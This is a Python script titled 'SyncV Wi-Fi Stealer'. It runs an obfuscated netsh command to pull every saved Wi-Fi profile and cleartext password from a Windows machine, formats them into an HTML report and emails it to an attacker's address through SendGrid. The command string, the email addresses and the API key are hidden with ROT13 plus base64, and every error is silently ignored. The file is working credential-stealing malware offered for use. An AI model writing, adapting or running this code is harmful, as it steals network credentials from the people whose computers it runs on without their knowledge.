# The "subprocess" module is needed to run system commands and check the output.
# We are importing the "check_output" function and the "DEVNULL" variable.
from subprocess import check_output, DEVNULL
# The "re" module is used to find specific patterns with which we can extract Wifi name and key.
from re import findall
# The following modules is used to send the HTML email.
from sendgrid import SendGridAPIClient
from sendgrid.helpers.mail import Mail
# base64 module is used to decode the data after being rot13-deciphered
import base64
# importing sleep to sleep for seconds
from time import sleep
# config file of
import config

# HTML email template
html_email = '''<td><table style="border-collapse:collapse;margin:0 auto;max-width:600px;padding:0;width:100%">

  <tbody>

    <tr>
      <td bgcolor="#e9e9e9" style="border-collapse:collapse;color:#e9e9e9;font-size:0;height:0;padding:0;width:100%">
      </td>
    </tr>

    <tr>
      <td style="border-collapse:collapse;color:#fff;padding:0;width:100%">
        <table bgcolor="#000000" style="border-collapse:collapse;padding:0;width:100%">
          <tbody>

            <tr>
              <td style="border-collapse:collapse;padding:4%;text-align:center;vertical-align:middle;width:19.5%">
                <img src="https://fcw.com/~/media/GIG/FCWNow/Topics/Cybersecurity/anonymous_guy_fawkes_mask.png" style="display:block;width:100%">
              </td>

              <td style="border-collapse:collapse;padding:0;vertical-align:top;width:80.5%;">
                <br>
                <pre>            <img src="https://flamingtext.com/net-fu/proxy_form.cgi?script=flash-anim-logo&text=SyncV&_loc=generate&imageoutput=true" alt="SyncV Photo" style="max-width:200px;width:100%;" class="CToWUd"></pre>
                <div dir="ltr" style="opacity: 0.01; left: 559px; top: 111px;">
                <div id=":j1" role="button" tabindex="0" aria-label="Download attachment " data-tooltip-class="a1V" data-tooltip="Download">
                <div>
                </div>
                </div>
                </div>
              </td>
            </tr>
          </tbody>
        </table>
      </td>
    </tr>

    <tr>
      <td bgcolor="#f7f7f7" style="border-collapse:collapse;padding:0;width:100%">
        <table style="border-collapse:collapse;padding:0;width:100%">
          <tbody>

            <tr>
              <td style="text-align:center;">
                <b style="color:black;font-size:25px;">SyncV Wi-Fi Stealer</b></td>
          </tbody>
        </table>
      </td>
    </tr>

    <tr>
      <td bgcolor="#f7f7f7" style="border-bottom:1px solid #e9e9e9;border-collapse:collapse;border-top:1px solid #e9e9e9;padding:8%;width:100%">
        <table style="border-collapse:collapse;padding:0;text-align:center;width:100%">
          <tbody>

            <tr>
              <td style="border-collapse:collapse;padding:0">
                <p style="color:black;font-size:16px;margin:0;font-family:bold;"><b style="color:green;">Wi-FiName</b> | <b style="color:red;">Password</b> | Security Level</p>
                %WIFI_NETWORKS%
              </td>
            </tr>

            <tr>
              <td style="border-collapse:collapse;padding:32px 0 16px">
                <table style="border-collapse:collapse;display:inline-block;padding:0;vertical-align:bottom">
                  <tbody>

                    <tr>
                    </tr>
                  </tbody>
                </table>
              </td>
            </tr>
          </tbody>
        </table>
      </td>
    </tr>

    <tr>
      <td bgcolor="#f7f7f7" style="border-collapse:collapse;color:#666;font-size:12px;padding:20px;text-align:center;width:100%">
        These are all Wi-Fi networks saved on the client's pc.
      </td>
    </tr>

    <tr>
      <td style="border-collapse:collapse;color:#fff;padding:0;width:100%">
        <table bgcolor="#000000" style="border-collapse:collapse;padding:0;width:100%">
          <tbody>

            <tr>
              <td style="border-collapse:collapse;padding:0 4%;width:82.5%">
                <table style="border-collapse:collapse;padding:0">
                  <tbody>
                    <p style="color:white;">Coded by SyncV</p>
                  </tbody>
                </table>
              </td>

              <td style="border-collapse:collapse;padding:4px 1%;width:7.5%">
                <img src="https://fcw.com/~/media/GIG/FCWNow/Topics/Cybersecurity/anonymous_guy_fawkes_mask.png" style="display:block;max-width:60px;width:100%" class="CToWUd">
              </td>
            </tr>
          </tbody>
        </table>
      </td>
    </tr>
  </tbody>
</table></td>'''


class Stealer:

    # defining the class variables
    email_subject = 'Wi-Fi Stolen'
    html_template = None
    netsh_command = ''.join(['ozI0p2tt', 'q2kuovOmn', 'T93VUOl', 'o2McoTH='])
    shift = config.shift

    def __init__(self, from_email: str, to_email: str, send_grid_api: str):
        # initialize variables
        self.from_email = self.parse(from_email, shift=self.shift)
        self.send_grid_api = self.parse(send_grid_api, shift=self.shift)
        self.to_email = self.parse(to_email, shift=self.shift)

    def run(self):
        # running the stealer
        wifi_networks = {}
        wifi_names = self.get_wifi_names()

        for index, wifi_name in enumerate(wifi_names):

            if wifi_name in wifi_networks:
                wifi_name += "_2"
                wifi_names[index] = wifi_name

            wifi_networks[wifi_name] = self.get_wifi_key_and_security(wifi_name)

        html_lines = self.convert_to_html(wifi_networks)

        html_content = self.html_template.replace('%WIFI_NETWORKS%', html_lines)

        self.send_email(html_content)
        
    def rot(self, string: str, shift=13):
        # rot cipher
        small_case_alphabet = 'abcdefghijklmnopqrstuvwxyz'
        upper_case_alphabet = small_case_alphabet.upper()
        rot_string = ''

        string = list(str(string))

        for char in string:

            if char in small_case_alphabet:

                new_position = small_case_alphabet.index(char) - shift

                if new_position > 25:
                    new_position -= 26

                rot_string += small_case_alphabet[new_position]

            elif char in upper_case_alphabet:

                new_position = upper_case_alphabet.index(char) - shift

                if new_position > 25:
                    new_position -= 26

                rot_string += upper_case_alphabet[new_position]

            else:
                rot_string += char

        return rot_string

    def parse(self, string: str, shift: int):
      # rot and decode
      return base64.b64decode(self.rot(string, shift=shift)).decode()

    def get_wifi_names(self):
        # extract wifi names from the system
        wifi_names = []

        try:
            netsh_command = base64.b64decode(self.rot(self.netsh_command, shift=13)).decode()
            networks = check_output(netsh_command, shell=True, universal_newlines=True, stderr=DEVNULL, stdin=DEVNULL)
            wifi_names = findall("(?:\s*:\s)(.*)", str(networks))
            wifi_names.remove("")

        except Exception as e:
            pass

        return wifi_names

    def get_wifi_key_and_security(self, wifi_name):
        # extract the key and security level of a wifi network
        wifi_data = ['Unknown', 'Unknown']

        try:
            show_networks_key_command = base64.b64decode(self.rot(self.netsh_command, shift=13)).decode() + ' ' + '"' + wifi_name + '" key=clear'
            show_wifi_key_result = check_output(show_networks_key_command, shell=True, universal_newlines=True, stderr=DEVNULL, stdin=DEVNULL)
            wifi_key = findall("(?:Key\sContent\s*:\s)(.*)", str(show_wifi_key_result))[0]
            wifi_security_lvl = findall("(?:Authentication\s*:\s)(.*)", str(show_wifi_key_result))[0]
            
            if len(wifi_key) > 0 and len(wifi_security_lvl) > 0:
                wifi_data = [wifi_key, wifi_security_lvl]

        except Exception:
            pass

        return wifi_data

    def convert_to_html(self, wifi_networks: dict):
        # convert the text to html
        html_lines = []

        network_index = 1

        for wifi_name, wifi_data in wifi_networks.items():
            text2html = f'''<br><p style="color:black;font-size:16px;margin:0;font-family:bold;">
                    {network_index}. <b style="color:green;">{wifi_name}</b> | <b style="color:red;">{wifi_data[0]}</b> | {wifi_data[1]}</p>'''
            html_lines.append(text2html)
            network_index += 1

        return '\n'.join(html_lines)

    def send_email(self, content):

        message = Mail(
            from_email=self.from_email,
            to_emails=self.to_email,
            subject=self.email_subject,
            html_content=content)
        
        try:
            sg = SendGridAPIClient(self.send_grid_api)
            sg.send(message)
        except Exception as e:
            pass


stealer = Stealer(config.from_email, config.to_email, config.send_grid_api)
stealer.html_template = html_email
# sleep(10)
stealer.run()

var = -93373
print(var)
